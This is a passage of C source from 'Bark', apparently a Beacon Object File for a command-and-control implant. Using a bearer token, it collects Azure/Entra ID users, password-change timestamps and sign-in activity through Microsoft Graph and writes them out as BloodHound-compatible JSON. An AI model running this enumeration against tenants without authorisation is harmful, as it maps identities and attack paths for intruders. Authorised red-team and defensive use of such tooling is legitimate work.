               MSVCRT$strcmp(kind, "AZGroup") == 0) {
        normalizationKeys = userGroupKeys;
        normalizationKeyCount = (int)(sizeof(userGroupKeys) /
            sizeof(userGroupKeys[0]));
    } else if (MSVCRT$strcmp(kind, "AZDevice") == 0) {
        normalizationKeys = deviceKeys;
        normalizationKeyCount = (int)(sizeof(deviceKeys) /
            sizeof(deviceKeys[0]));
    } else if (MSVCRT$strcmp(kind, "AZRole") == 0) {
        normalizationKeys = roleKeys;
        normalizationKeyCount = (int)(sizeof(roleKeys) /
            sizeof(roleKeys[0]));
    } else if (MSVCRT$strcmp(kind, "AZApp") == 0) {
        normalizationKeys = appKeys;
        normalizationKeyCount = (int)(sizeof(appKeys) /
            sizeof(appKeys[0]));
    } else if (MSVCRT$strcmp(kind, "AZServicePrincipal") == 0) {
        normalizationKeys = servicePrincipalKeys;
        normalizationKeyCount = (int)(sizeof(servicePrincipalKeys) /
            sizeof(servicePrincipalKeys[0]));
    } else if (MSVCRT$strcmp(kind, "AZFederatedIdentityCredential") == 0) {
        normalizationKeys = federatedCredentialKeys;
        normalizationKeyCount = (int)(sizeof(federatedCredentialKeys) /
            sizeof(federatedCredentialKeys[0]));
    } else if (MSVCRT$strcmp(kind, "AZAppRoleAssignment") == 0) {
        normalizationKeys = appRoleAssignmentKeys;
        normalizationKeyCount = (int)(sizeof(appRoleAssignmentKeys) /
            sizeof(appRoleAssignmentKeys[0]));
    } else if (MSVCRT$strcmp(kind, "AZSubscription") == 0) {
        normalizationKeys = subscriptionKeys;
        normalizationKeyCount = (int)(sizeof(subscriptionKeys) /
            sizeof(subscriptionKeys[0]));
    } else if (BarkBHKindUsesNormalizedObjectId(kind)) {
        normalizationKeys = armKeys;
        normalizationKeyCount = (int)(sizeof(armKeys) /
            sizeof(armKeys[0]));
    }

    if (normalizationKeys) {
        hasFieldNormalization = BarkBufAppendUppercaseJsonStringFields(
            out, source, sourceEnd, normalizationKeys,
            normalizationKeyCount);
    }
    if (!hasFieldNormalization &&
        (hasIdNormalization || hasShapeCompatibility)) {
        BarkBufAppend(out, source, (SIZE_T)(sourceEnd - source));
        hasFieldNormalization = out->ok && out->buf;
    }
    BarkBufFree(&idNormalized);
    BarkBufFree(&shaped);
    return hasFieldNormalization;
}

/* Re-emit one BH item into a BarkBuf.
 * aliasObjectId: when non-zero, extracts "objectId" from the item and appends
 * ,"id":"<value>" at the end of the data object (for legacy AAD Graph items). */
static void BarkBufPrintBHItem(BarkBuf *b, const char *kind,
                               const char *item, const char *itemEnd,
                               int isFirst, const char *dataSuffix,
                               int aliasObjectId) {
    BarkBuf assembled = { NULL, 0, 0, 1 };
    BarkBuf compatibility = { NULL, 0, 0, 1 };
    const char *source = item;
    const char *sourceEnd = itemEnd;
    const char *emitItem;
    const char *emitEnd;
    char prefix[256];
    int n;

    /* Assemble aliases and injected context first. Compatibility casing must
     * see these fields too; applying it before dataSuffix used to leave
     * tenantId/resource IDs lowercase and split nodes under raw-ID ingest. */
    if ((dataSuffix || aliasObjectId) &&
        (itemEnd > item) && *(itemEnd - 1) == '}') {
        if (aliasObjectId) {
            /* Rename "objectId" key to "id": split copy around the key name */
            const char *okPos = JsonFindKey(item, itemEnd, "\"objectId\"");
            if (okPos) {
                BarkBufAppend(&assembled, item,
                    (SIZE_T)(okPos - item));
                BarkBufAppend(&assembled, "\"id\"", 4);
                const char *afterKey = okPos + 10;              /* 10 = len("\"objectId\"") */
                BarkBufAppend(&assembled, afterKey,
                    (SIZE_T)(itemEnd - 1 - afterKey));
            } else {
                BarkBufAppend(&assembled, item,
                    (SIZE_T)(itemEnd - item - 1));
            }
        } else {
            BarkBufAppend(&assembled, item,
                (SIZE_T)(itemEnd - item - 1));
        }
        if (dataSuffix) {
            BarkBufAppend(&assembled, ",", 1);
            BarkBufAppend(&assembled, dataSuffix,
                MSVCRT$strlen(dataSuffix));
        }
        BarkBufAppend(&assembled, "}", 1);
        if (assembled.ok && assembled.buf) {
            source = assembled.buf;
            sourceEnd = assembled.buf + assembled.len;
        }
    }

    emitItem = source;
    emitEnd = sourceEnd;
    if (BarkBuildBHCompatibleItem(
            kind, source, sourceEnd, &compatibility)) {
        emitItem = compatibility.buf;
        emitEnd = compatibility.buf + compatibility.len;
    }
    if (isFirst)
        n = MSVCRT$sprintf_s(prefix, sizeof(prefix),
                             "{\"kind\":\"%s\",\"data\":", kind);
    else
        n = MSVCRT$sprintf_s(prefix, sizeof(prefix),
                             ",{\"kind\":\"%s\",\"data\":", kind);
    if (n > 0) BarkBufAppend(b, prefix, (SIZE_T)n);
    BarkBufAppend(b, emitItem, (SIZE_T)(emitEnd - emitItem));
    BarkBufAppend(b, "}", 1);
    BarkBufFree(&assembled);
    BarkBufFree(&compatibility);
}

static int BarkBufEmitBHArrayBody(BarkBuf *b,
                                  const char *body, const char *bodyEnd,
                                  const char *kind, int alreadyEmitted,
                                  const char *dataSuffix, int aliasObjectId) {
    int count = 0;
    const char *p = body;
    while (p < bodyEnd) {
        while (p < bodyEnd &&
               (*p == ' ' || *p == '\n' || *p == '\r' ||
                *p == '\t' || *p == ','))
            p++;
        if (p >= bodyEnd || *p != '{') break;
        const char *itemEnd = JsonSkipBalanced(p, bodyEnd);
        if (!itemEnd) break;
        BarkBufPrintBHItem(b, kind, p, itemEnd,
                           (alreadyEmitted + count) == 0, dataSuffix, aliasObjectId);
        count++;
        p = itemEnd;
    }
    return count;
}

/*
 * User password-change enrichment
 *
 * The broad beta user projection is useful to Bark (it carries several
 * properties that AzureHound does not request), but Graph does not reliably
 * include lastPasswordChangeDateTime in that projection.  AzureHound gets
 * the field from the v1.0 users endpoint.  Fetch the small v1.0 projection
 * first, then merge the value into Bark's broad objects before they are
 * serialized.  This keeps the broad schema while making the attack-path
 * relevant timestamp deterministic.
 */
typedef struct {
    char **ids;
    char **values;
    int count;
    int cap;
} BarkUserPasswordMap;

static void BarkUserPasswordMapInit(BarkUserPasswordMap *map) {
    map->ids = NULL;
    map->values = NULL;
    map->count = 0;
    map->cap = 0;
}

static void BarkUserPasswordMapFree(BarkUserPasswordMap *map) {
    int i;
    for (i = 0; i < map->count; i++) {
        HFree(map->ids[i]);
        HFree(map->values[i]);
    }
    if (map->ids) HFree(map->ids);
    if (map->values) HFree(map->values);
    BarkUserPasswordMapInit(map);
}

static int BarkUserPasswordMapPut(BarkUserPasswordMap *map,
                                  char *id, char *value) {
    int i;
    char *idCopy;
    char *valueCopy;

    if (!id || !value || id[0] == '\0' || value[0] == '\0') return -1;
    for (i = 0; i < map->count; i++) {
        if (MSVCRT$strcmp(map->ids[i], id) == 0) {
            HFree(map->values[i]);
            map->values[i] = value;
            HFree(id);
            return 0;
        }
    }

    if (map->count >= map->cap) {
        int newCap = map->cap == 0 ? 128 : map->cap * 2;
        char **newIds = (char **)HAlloc((SIZE_T)newCap * sizeof(char *));
        char **newValues = (char **)HAlloc((SIZE_T)newCap * sizeof(char *));
        if (!newIds || !newValues) {
            if (newIds) HFree(newIds);
            if (newValues) HFree(newValues);
            return -1;
        }
        if (map->count > 0) {
            MSVCRT$memcpy(newIds, map->ids,
                (SIZE_T)map->count * sizeof(char *));
            MSVCRT$memcpy(newValues, map->values,
                (SIZE_T)map->count * sizeof(char *));
        }
        if (map->ids) HFree(map->ids);
        if (map->values) HFree(map->values);
        map->ids = newIds;
        map->values = newValues;
        map->cap = newCap;
    }

    idCopy = id;
    valueCopy = value;
    map->ids[map->count] = idCopy;
    map->values[map->count] = valueCopy;
    map->count++;
    return 0;
}

static const char *BarkUserPasswordMapFind(const BarkUserPasswordMap *map,
                                           const char *id) {
    int i;
    if (!id) return NULL;
    for (i = 0; i < map->count; i++) {
        if (MSVCRT$strcmp(map->ids[i], id) == 0)
            return map->values[i];
    }
    return NULL;
}

static void BarkBufPrintBHUserItem(BarkBuf *b, const char *kind,
                                   const char *item, const char *itemEnd,
                                   int isFirst, const char *dataSuffix,
                                   const char *password,
                                   const char *signInActivity) {
    const char *key;
    const char *valueStart = NULL;
    const char *valueEnd = NULL;
    int replaceNull = 0;
    BarkBuf passwordItem = { NULL, 0, 0, 1 };
    BarkBuf compatibleItem = { NULL, 0, 0, 1 };
    const char *source = item;
    const char *sourceEnd = itemEnd;

    key = JsonFindKey(item, itemEnd, "\"lastPasswordChangeDateTime\"");
    if (password && password[0] && key) {
        const char *colon = JsonFindKey(
            key + MSVCRT$strlen("\"lastPasswordChangeDateTime\""),
            itemEnd, ":");
        if (colon) {
            valueStart = colon + 1;
            while (valueStart < itemEnd &&
                   (*valueStart == ' ' || *valueStart == '\t' ||
                    *valueStart == '\n' || *valueStart == '\r'))
                valueStart++;
            if (valueStart + 4 <= itemEnd &&
                MSVCRT$strncmp(valueStart, "null", 4) == 0) {
                valueEnd = valueStart + 4;
                replaceNull = 1;
            }
        }
    }

    if (password && password[0] && (replaceNull || !key)) {
        if (replaceNull) {
            BarkBufAppend(&passwordItem, item,
                (SIZE_T)(valueStart - item));
            BarkBufAppend(&passwordItem, "\"", 1);
            BarkBufAppend(&passwordItem, password, MSVCRT$strlen(password));
            BarkBufAppend(&passwordItem, "\"", 1);
            BarkBufAppend(&passwordItem, valueEnd,
                (SIZE_T)(itemEnd - valueEnd));
        } else if (itemEnd > item && *(itemEnd - 1) == '}') {
            BarkBufAppend(&passwordItem, item,
                (SIZE_T)(itemEnd - item - 1));
            BarkBufAppend(&passwordItem,
                ",\"lastPasswordChangeDateTime\":\"",
                MSVCRT$strlen(",\"lastPasswordChangeDateTime\":\""));
            BarkBufAppend(&passwordItem, password, MSVCRT$strlen(password));
            BarkBufAppend(&passwordItem, "\"}", 2);
        }
        if (passwordItem.ok && passwordItem.buf) {
            source = passwordItem.buf;
            sourceEnd = passwordItem.buf + passwordItem.len;
        }
    }

    /* signInActivity is permission-gated.  Emit its real object when the
     * optional enrichment succeeded and AzureHound-compatible empty model
     * shapes otherwise. mailboxSettings in AzureHound's user output is also
     * an empty model unless explicitly collected through Exchange scopes. */
    if (sourceEnd > source && *(sourceEnd - 1) == '}') {
        BarkBufAppend(&compatibleItem, source,
            (SIZE_T)(sourceEnd - source - 1));
        if (!JsonFindKey(source, sourceEnd, "\"signInActivity\"")) {
            BarkBufAppend(&compatibleItem, ",\"signInActivity\":", 18);
            if (signInActivity && signInActivity[0])
                BarkBufAppend(&compatibleItem, signInActivity,
                    MSVCRT$strlen(signInActivity));
            else
                BarkBufAppend(&compatibleItem, "{}", 2);
        }
        if (!JsonFindKey(source, sourceEnd, "\"mailboxSettings\"")) {
            const char *emptyMailbox =
                ",\"mailboxSettings\":{"
                "\"automaticRepliesSetting\":{"
                "\"scheduledEndDateTime\":{},"
                "\"scheduledStartDateTime\":{}},"
                "\"language\":{},\"workingHours\":{"
                "\"timeZoneBase\":{}}}";
            BarkBufAppend(&compatibleItem, emptyMailbox,
                MSVCRT$strlen(emptyMailbox));
        }
        BarkBufAppend(&compatibleItem, "}", 1);
    }

    if (compatibleItem.ok && compatibleItem.buf) {
        BarkBufPrintBHItem(b, kind, compatibleItem.buf,
            compatibleItem.buf + compatibleItem.len,
            isFirst, dataSuffix, 0);
    } else {
        BarkBufPrintBHItem(b, kind, source, sourceEnd,
            isFirst, dataSuffix, 0);
    }
    BarkBufFree(&compatibleItem);
    BarkBufFree(&passwordItem);
}

static void BarkCollectBHUserPasswords(const char *bearerToken,
                                       BarkUserPasswordMap *map) {
    const char *initialPath =
        "/v1.0/users?$top=999&$select=id,lastPasswordChangeDateTime";
    LPWSTR hdrWide = BarkMakeAuthHeader(
        bearerToken, "ConsistencyLevel: eventual\r\n");
    LPWSTR widePath;
    LPWSTR nextWide = NULL;
    char *nextUrl = NULL;
    LPCWSTR pathArg;

    if (!hdrWide) return;
    widePath = MbsToWcs(initialPath);
    if (!widePath) { HFree(hdrWide); return; }
    pathArg = widePath;

    while (1) {
        DWORD status = 0;
        char *resp = HttpRequestWithRetry(L"GET", L"graph.microsoft.com",
            pathArg, hdrWide, NULL, 0, &status);
        if (nextUrl) { HFree(nextUrl); nextUrl = NULL; }
        if (nextWide) { HFree(nextWide); nextWide = NULL; }
        if (!resp || status >= 400) {
            if (resp) HFree(resp);
            break;
        }

        {
            const char *end = resp + MSVCRT$strlen(resp);
            const char *valueKey = JsonFindKey(resp, end, "\"value\"");
            if (valueKey) {
                const char *colon = JsonFindKey(valueKey, end, ":");
                if (colon) {
                    colon++;
                    while (colon < end &&
                           (*colon == ' ' || *colon == '\t' ||
                            *colon == '\n' || *colon == '\r')) colon++;
                    if (colon < end && *colon == '[') {
                        const char *arrayEnd = JsonSkipBalanced(colon, end);
                        const char *p = colon + 1;
                        while (arrayEnd && p < arrayEnd - 1) {
                            const char *itemEnd;
                            char *id;
                            char *password;
                            while (p < arrayEnd - 1 && *p != '{') p++;
                            if (p >= arrayEnd - 1) break;
                            itemEnd = JsonSkipBalanced(p, arrayEnd);
                            if (!itemEnd) break;
                            id = JsonExtractStringValue(p, itemEnd, "\"id\"");
                            password = JsonExtractStringValue(p, itemEnd,
                                "\"lastPasswordChangeDateTime\"");
                            if (id && password) {
                                if (BarkUserPasswordMapPut(map, id, password) != 0) {
                                    HFree(id);
                                    HFree(password);
                                }
                            } else {
                                if (id) HFree(id);
                                if (password) HFree(password);
                            }
                            p = itemEnd;
                        }
                    }
                }
            }
            nextUrl = JsonExtractNextLink(resp, end);
        }
        HFree(resp);
        if (!nextUrl) break;
        nextWide = BarkResolveNextLink(nextUrl,
            L"graph.microsoft.com", "");
        if (!nextWide) break;
        pathArg = nextWide;
    }

    if (nextUrl) HFree(nextUrl);
    if (nextWide) HFree(nextWide);
    HFree(widePath);
    HFree(hdrWide);
}

/* Collect the permission-gated signInActivity projection separately.  A 403
 * is expected for refresh tokens without AuditLog.Read.All; broad user
 * collection continues and receives the same empty object AzureHound emits. */
static void BarkCollectBHUserSignInActivity(const char *bearerToken,
                                            BarkUserPasswordMap *map) {
    const char *initialPath =
        "/v1.0/users?$top=500&$select=id,signInActivity";
    LPWSTR hdrWide = BarkMakeAuthHeader(
        bearerToken, "ConsistencyLevel: eventual\r\n");
    LPWSTR widePath;
    LPWSTR nextWide = NULL;
    char *nextUrl = NULL;
    LPCWSTR pathArg;

    if (!hdrWide) return;
    widePath = MbsToWcs(initialPath);
    if (!widePath) { HFree(hdrWide); return; }
    pathArg = widePath;

    while (1) {
        DWORD status = 0;
        char *resp = HttpRequestWithRetry(L"GET", L"graph.microsoft.com",
            pathArg, hdrWide, NULL, 0, &status);
        if (nextUrl) { HFree(nextUrl); nextUrl = NULL; }
        if (nextWide) { HFree(nextWide); nextWide = NULL; }
        if (!resp || status >= 400) {
            if (status == 403) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[!] signInActivity unavailable (AuditLog.Read.All/P1-P2 required); continuing without it\n");
            }
            if (resp) HFree(resp);
            break;
        }

        {
            const char *end = resp + MSVCRT$strlen(resp);
            const char *valueKey = JsonFindKey(resp, end, "\"value\"");
            const char *colon = valueKey ? JsonFindKey(valueKey, end, ":") : NULL;
            if (colon) {
                const char *arrayEnd;
                const char *p;
                colon++;
                while (colon < end &&
                       (*colon == ' ' || *colon == '\t' ||
                        *colon == '\n' || *colon == '\r')) colon++;
                arrayEnd = (colon < end && *colon == '[') ?
                    JsonSkipBalanced(colon, end) : NULL;
                p = colon + 1;
                while (arrayEnd && p < arrayEnd - 1) {
                    const char *itemEnd;
                    const char *activityKey;
                    const char *activityColon;
                    const char *activityEnd;
                    char *id;
                    char *activity = NULL;
                    while (p < arrayEnd - 1 && *p != '{') p++;
                    if (p >= arrayEnd - 1) break;
                    itemEnd = JsonSkipBalanced(p, arrayEnd);
                    if (!itemEnd) break;
                    id = JsonExtractStringValue(p, itemEnd, "\"id\"");
                    activityKey = JsonFindKey(
                        p, itemEnd, "\"signInActivity\"");
                    activityColon = activityKey ?
                        JsonFindKey(activityKey, itemEnd, ":") : NULL;
                    if (activityColon) {
                        activityColon++;
                        while (activityColon < itemEnd &&
                               (*activityColon == ' ' || *activityColon == '\t' ||
                                *activityColon == '\n' || *activityColon == '\r'))
                            activityColon++;
                        activityEnd = (activityColon < itemEnd &&
                                       *activityColon == '{') ?
                            JsonSkipBalanced(activityColon, itemEnd) : NULL;
                        if (activityEnd) {
                            SIZE_T activityLen =
                                (SIZE_T)(activityEnd - activityColon);
                            activity = (char *)HAlloc(activityLen + 1);
                            if (activity) {
                                MSVCRT$memcpy(activity, activityColon,
                                    activityLen);
                                activity[activityLen] = '\0';
                            }
                        }
                    }
                    if (id && activity) {
                        if (BarkUserPasswordMapPut(map, id, activity) != 0) {
                            HFree(id);
                            HFree(activity);
                        }
                    } else {
                        if (id) HFree(id);
                        if (activity) HFree(activity);
                    }
                    p = itemEnd;
                }
            }
            nextUrl = JsonExtractNextLink(resp, end);
        }
        HFree(resp);
        if (!nextUrl) break;
        nextWide = BarkResolveNextLink(nextUrl,
            L"graph.microsoft.com", "");
        if (!nextWide) break;
        pathArg = nextWide;
    }

    if (nextUrl) HFree(nextUrl);
    if (nextWide) HFree(nextWide);
    HFree(widePath);
    HFree(hdrWide);
}

static void BarkGetBHUsersWithPassword(const char *bearerToken,
                                        LPCWSTR broadPath,
                                        const char *dataSuffix) {
    BarkUserPasswordMap passwordMap;
    BarkUserPasswordMap signInMap;
    BarkBuf output = { NULL, 0, 0, 1 };
    LPWSTR hdrWide;
    LPWSTR widePath;
    LPWSTR nextWide = NULL;
    char *nextUrl = NULL;
    LPCWSTR pathArg;
    int emitted = 0;

    BarkUserPasswordMapInit(&passwordMap);
    BarkUserPasswordMapInit(&signInMap);
    BarkCollectBHUserPasswords(bearerToken, &passwordMap);
    BarkCollectBHUserSignInActivity(bearerToken, &signInMap);

    hdrWide = BarkMakeAuthHeader(
        bearerToken, "ConsistencyLevel: eventual\r\n");
    /* broadPath is already a wide string (callers pass an LPCWSTR literal). */
    widePath = (LPWSTR)broadPath;
    if (!hdrWide || !widePath) {
        if (hdrWide) HFree(hdrWide);
        BarkUserPasswordMapFree(&passwordMap);
        BarkUserPasswordMapFree(&signInMap);
        return;
    }
    pathArg = widePath;
    BarkBufAppend(&output, "{\"data\":[", 9);

    while (1) {
        DWORD status = 0;
        char *resp = HttpRequestWithRetry(L"GET", L"graph.microsoft.com",
            pathArg, hdrWide, NULL, 0, &status);
        if (nextUrl) { HFree(nextUrl); nextUrl = NULL; }
        if (nextWide) { HFree(nextWide); nextWide = NULL; }
        if (!resp || status >= 400) {
            if (resp) HFree(resp);
            break;
        }

        {
            const char *end = resp + MSVCRT$strlen(resp);
            const char *valueKey = JsonFindKey(resp, end, "\"value\"");
            if (valueKey) {
                const char *colon = JsonFindKey(valueKey, end, ":");
                if (colon) {
                    colon++;
                    while (colon < end &&
                           (*colon == ' ' || *colon == '\t' ||
                            *colon == '\n' || *colon == '\r')) colon++;
                    if (colon < end && *colon == '[') {
                        const char *arrayEnd = JsonSkipBalanced(colon, end);
                        const char *p = colon + 1;
                        while (arrayEnd && p < arrayEnd - 1) {
                            const char *itemEnd;
                            char *id;
                            const char *password;
                            const char *signInActivity;
                            while (p < arrayEnd - 1 && *p != '{') p++;
                            if (p >= arrayEnd - 1) break;
                            itemEnd = JsonSkipBalanced(p, arrayEnd);
                            if (!itemEnd) break;
                            id = JsonExtractStringValue(p, itemEnd, "\"id\"");
                            password = id ? BarkUserPasswordMapFind(
                                &passwordMap, id) : NULL;
                            signInActivity = id ? BarkUserPasswordMapFind(
                                &signInMap, id) : NULL;
                            BarkBufPrintBHUserItem(&output, "AZUser", p,
                                itemEnd, emitted == 0, dataSuffix, password,
                                signInActivity);
                            emitted++;
                            if (id) HFree(id);
                            p = itemEnd;
                        }
                    }
                }
            }
            nextUrl = JsonExtractNextLink(resp, end);
        }
        HFree(resp);
        if (!nextUrl) break;
        nextWide = BarkResolveNextLink(nextUrl,
            L"graph.microsoft.com", "");
        if (!nextWide) break;
        pathArg = nextWide;
    }

    {
        char tail[128];
        int tailLen = MSVCRT$sprintf_s(tail, sizeof(tail),
            "],\"meta\":{\"type\":\"azure\",\"version\":5,\"count\":%d}}", emitted);
        if (tailLen > 0) BarkBufAppend(&output, tail, (SIZE_T)tailLen);
    }

    if (output.ok && output.buf) {
        SYSTEMTIME st;
        char filename[300];
        KERNEL32$GetLocalTime(&st);
        MSVCRT$sprintf_s(filename, sizeof(filename),
            ".\\AZUser_%04u%02u%02u_%02u%02u%02u.json",
            (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay,
            (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond);
        BarkWriteOutput(filename, output.buf, (DWORD)output.len);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] BARK AZUser found %d objects (%d password timestamps)\n",
            emitted, passwordMap.count);
    }

    if (nextUrl) HFree(nextUrl);
    if (nextWide) HFree(nextWide);
    HFree(hdrWide);
    BarkBufFree(&output);
    BarkUserPasswordMapFree(&passwordMap);
    BarkUserPasswordMapFree(&signInMap);
}

/* Buffered variant of BarkGetBHPage. Same logic; output goes to `b`. */
static char *BarkGetBHPageBuf(LPCWSTR host, LPCWSTR widePath,
                              const char *bearerToken, const char *kind,
                              BarkBuf *b,
                              int *alreadyEmitted, int *gotArrayShape,
                              const char *dataSuffix, int aliasObjectId) {
    DWORD  status  = 0;
    char  *resp    = NULL;
    char  *nextUrl = NULL;

    LPWSTR hdrWide = BarkMakeAuthHeader(bearerToken, "ConsistencyLevel: eventual\r\n");
    if (!hdrWide) {
        BeaconPrintf(CALLBACK_ERROR, "[-] BarkGetBH: header conversion failed\n");
        return NULL;
    }
    resp = HttpRequestWithRetry(L"GET", host, widePath, hdrWide, NULL, 0, &status);
    HFree(hdrWide);
    if (!resp) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] BarkGetBH: request failed (HTTP %lu)\n", status);
        return NULL;
    }
    if (status >= 400) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] BarkGetBH: HTTP %lu error:\n    %s\n", status, resp);
        HFree(resp);
        return NULL;
    }

    SIZE_T respLen = MSVCRT$strlen(resp);
    const char *end = resp + respLen;

    const char *vKey = JsonFindKey(resp, end, "\"value\"");
    if (vKey) {
        const char *bracket = JsonFindKey(vKey, end, ":");
        if (bracket) {
            bracket++;
            while (bracket < end &&
                   (*bracket == ' ' || *bracket == '\t' ||
                    *bracket == '\n' || *bracket == '\r'))
                bracket++;
            if (bracket < end && *bracket == '[') {
                const char *arrEnd = JsonSkipBalanced(bracket, end);
                if (arrEnd) {
                    *gotArrayShape = 1;
                    int n = BarkBufEmitBHArrayBody(
                        b, bracket + 1, arrEnd - 1, kind, *alreadyEmitted, dataSuffix, aliasObjectId);
                    *alreadyEmitted += n;
                    nextUrl = JsonExtractNextLink(resp, end);
                }
            }
        }
    }

    if (!*gotArrayShape) {
        BarkBufPrintBHItem(b, kind, resp, end, *alreadyEmitted == 0, dataSuffix, aliasObjectId);
        *alreadyEmitted += 1;
    }

    HFree(resp);
    return nextUrl;
}

/* ================================================================
 * JsonExtractStringValue
 *
 * Given a JSON object body between [obj, objEnd), find the key
 * `keyWithQuotes` (e.g. "\"subscriptionId\"") and return a
 * heap-allocated copy of its string value.  Returns NULL on failure.
 * Caller must HFree the result.
 * ================================================================ */
static char *JsonExtractStringValue(const char *obj, const char *objEnd,
                                    const char *keyWithQuotes) {
    const char *key = JsonFindKey(obj, objEnd, keyWithQuotes);
    if (!key) return NULL;
    const char *p = key + MSVCRT$strlen(keyWithQuotes);
    while (p < objEnd && (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')) p++;
    if (p >= objEnd || *p != ':') return NULL;
    p++;
    while (p < objEnd && (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')) p++;
    if (p >= objEnd || *p != '"') return NULL;
    const char *q = JsonSkipString(p, objEnd);
    if (!q) return NULL;
    /* p points to opening ", q points past closing " */
    size_t len = (size_t)((q - 1) - (p + 1));
    char *result = (char *)HAlloc(len + 1);
    if (!result) return NULL;
    MSVCRT$memcpy(result, p + 1, len);
    result[len] = '\0';
    return result;
}

/* Return the decoded UTF-8 value of a JSON string.  The regular extractor
 * above deliberately preserves JSON escapes so callers that splice a value
 * back into raw JSON can do so without another escaping pass.  Call this
 * variant when the value will be handled as text and serialized again.
 *
 * In particular, decoding \uXXXX (including surrogate pairs) prevents a
 * serializer from turning Japanese text such as \u65e5\u672c into the literal
 * six-character sequences "\\u65e5\\u672c". */
static int JsonHexDigit(unsigned char c) {
    if (c >= '0' && c <= '9') return (int)(c - '0');
    if (c >= 'a' && c <= 'f') return (int)(c - 'a') + 10;
    if (c >= 'A' && c <= 'F') return (int)(c - 'A') + 10;
    return -1;
}

static int JsonReadHex4(const char *p, unsigned int *value) {
    int i;
    unsigned int result = 0;
    for (i = 0; i < 4; i++) {
        int digit = JsonHexDigit((unsigned char)p[i]);
        if (digit < 0) return 0;
        result = (result << 4) | (unsigned int)digit;
    }
    *value = result;
    return 1;
}

static void JsonAppendUtf8CodePoint(char *dst, size_t *outLen,
                                    unsigned int codePoint) {
    size_t n = *outLen;

    /* A decoded NUL cannot be represented in the C strings used by the BOFs.
     * Invalid scalar values are likewise replaced instead of emitting invalid
     * UTF-8 into an output JSON file. */
    if (codePoint == 0 || codePoint > 0x10ffffU ||
        (codePoint >= 0xd800U && codePoint <= 0xdfffU))
        codePoint = 0xfffdU;

    if (codePoint <= 0x7fU) {
        dst[n++] = (char)codePoint;
    } else if (codePoint <= 0x7ffU) {
        dst[n++] = (char)(0xc0U | (codePoint >> 6));
        dst[n++] = (char)(0x80U | (codePoint & 0x3fU));
    } else if (codePoint <= 0xffffU) {
        dst[n++] = (char)(0xe0U | (codePoint >> 12));
        dst[n++] = (char)(0x80U | ((codePoint >> 6) & 0x3fU));
        dst[n++] = (char)(0x80U | (codePoint & 0x3fU));
    } else {
        dst[n++] = (char)(0xf0U | (codePoint >> 18));
        dst[n++] = (char)(0x80U | ((codePoint >> 12) & 0x3fU));
        dst[n++] = (char)(0x80U | ((codePoint >> 6) & 0x3fU));
        dst[n++] = (char)(0x80U | (codePoint & 0x3fU));
    }
    *outLen = n;
}

static char *JsonExtractStringValueUtf8(const char *obj, const char *objEnd,
                                        const char *keyWithQuotes) {
    char *raw = JsonExtractStringValue(obj, objEnd, keyWithQuotes);
    char *decoded;
    size_t rawLen;
    size_t i = 0;
    size_t outLen = 0;

    if (!raw) return NULL;
    rawLen = MSVCRT$strlen(raw);
    decoded = (char *)HAlloc(rawLen + 1);
    if (!decoded) {
        HFree(raw);
        return NULL;
    }

    while (i < rawLen) {
        unsigned char c = (unsigned char)raw[i++];
        if (c != '\\' || i >= rawLen) {
            decoded[outLen++] = (char)c;
            continue;
        }

        c = (unsigned char)raw[i++];
        if (c == '"' || c == '\\' || c == '/') {
            decoded[outLen++] = (char)c;
        } else if (c == 'b') {
            decoded[outLen++] = '\b';
        } else if (c == 'f') {
            decoded[outLen++] = '\f';
        } else if (c == 'n') {
            decoded[outLen++] = '\n';
        } else if (c == 'r') {
            decoded[outLen++] = '\r';
        } else if (c == 't') {
            decoded[outLen++] = '\t';
        } else if (c == 'u' && i + 4 <= rawLen) {
            unsigned int first;
            if (!JsonReadHex4(raw + i, &first)) {
                decoded[outLen++] = '\\';
                decoded[outLen++] = 'u';
                continue;
            }
            i += 4;
            if (first >= 0xd800U && first <= 0xdbffU &&
                i + 6 <= rawLen && raw[i] == '\\' && raw[i + 1] == 'u') {
                unsigned int second;
                if (JsonReadHex4(raw + i + 2, &second) &&
                    second >= 0xdc00U && second <= 0xdfffU) {
                    first = 0x10000U + ((first - 0xd800U) << 10) +
                            (second - 0xdc00U);
                    i += 6;
                }
            }
            JsonAppendUtf8CodePoint(decoded, &outLen, first);
        } else {
            /* Preserve malformed/unknown escapes as literal text. */
            decoded[outLen++] = '\\';
            decoded[outLen++] = (char)c;
        }
    }

    decoded[outLen] = '\0';
    HFree(raw);
    return decoded;
}

/* ================================================================
 * BarkFetchTenantDisplayName
 *
 * Call GET /v1.0/organization?$select=displayName and return a
 * heap-allocated copy of the tenant's displayName.
 * Returns NULL on failure.  Caller must HFree the result.
 * ================================================================ */
static char *BarkFetchTenantDisplayName(const char *bearerToken) {
    LPWSTR hdrWide = BarkMakeAuthHeader(bearerToken, "ConsistencyLevel: eventual\r\n");
    if (!hdrWide) return NULL;

    DWORD status = 0;
    char *resp = HttpRequestWithRetry(L"GET", L"graph.microsoft.com",
        L"/v1.0/organization?$select=displayName",
        hdrWide, NULL, 0, &status);
    HFree(hdrWide);
    if (!resp || status >= 400) { if (resp) HFree(resp); return NULL; }

    SIZE_T respLen = MSVCRT$strlen(resp);
    const char *end = resp + respLen;
    char *result = NULL;

    const char *vKey = JsonFindKey(resp, end, "\"value\"");
    if (vKey) {
        const char *colon = JsonFindKey(vKey, end, ":");
        if (colon) {
            colon++;
            while (colon < end && (*colon == ' ' || *colon == '\t' ||
                   *colon == '\n' || *colon == '\r')) colon++;
            if (colon < end && *colon == '[') {
                const char *arrEnd = JsonSkipBalanced(colon, end);
                if (arrEnd) {
                    const char *p = colon + 1;
                    while (p < arrEnd - 1 && *p != '{') p++;
                    if (p < arrEnd - 1) {
                        const char *itemEnd = JsonSkipBalanced(p, arrEnd);
                        if (itemEnd)
                            result = JsonExtractStringValue(p, itemEnd, "\"displayName\"");
                    }
                }
            }
        }
    }
    HFree(resp);
    return result;
}

/* ================================================================
 * BarkGetBHAllSubscriptions
 *
 * Auto-discover all Azure subscriptions, then for each one call
 * the ARM API path built from `pathFmt` (which must contain exactly
 * one %s placeholder for the subscription ID).  All results across
 * all subscriptions are merged into a single BH JSON envelope and
 * written to disk.
 *
 * Example:
 *   BarkGetBHAllSubscriptions(token,
